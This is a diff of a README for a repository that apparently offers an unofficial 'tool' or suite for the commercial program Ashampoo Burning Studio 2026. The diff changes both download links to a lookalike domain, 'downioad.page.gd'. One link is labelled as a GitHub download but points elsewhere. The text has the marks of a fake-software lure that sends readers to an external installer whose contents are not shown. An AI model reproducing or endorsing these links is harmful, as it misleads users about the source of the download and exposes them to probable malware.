@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive tool for Ashampoo Burning Studio 2026, offering enhanced features for disc burning and media management on Windows 10 and 11 systems. Designed for users seeking a seamless and efficient burning experience, this tool integrates seamlessly with your workflow. With support for various disc formats and advanced burning technologies, this suite ensures high-quality results every time. Whether you're backing up data, creating music compilations, or producing video DVDs, this tool has you covered.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ A: Currently, only the installer version is provided. A portable edition may be 
 
 Get the most recent release of Ashampoo Burning Studio 2026 Ultimate Suite from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
